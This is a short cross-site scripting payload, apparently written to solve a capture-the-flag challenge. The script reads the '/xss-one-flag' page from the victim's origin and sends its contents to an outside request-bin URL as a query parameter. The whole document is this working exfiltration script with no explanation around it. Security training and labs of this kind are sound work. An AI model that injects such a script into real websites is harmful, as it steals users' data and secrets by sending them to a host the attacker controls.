```<script>
	var xhr = new XMLHttpRequest(); 
	xhr.open('GET','/xss-one-flag', true); 
	xhr.onload = function () { 
		var request = new XMLHttpRequest(); 
		request.open('GET', 'https://REQUEST_BIN_URL?flag='+xhr.responseText, true);
		request.send()
	};
	xhr.send(null);
 </script>```

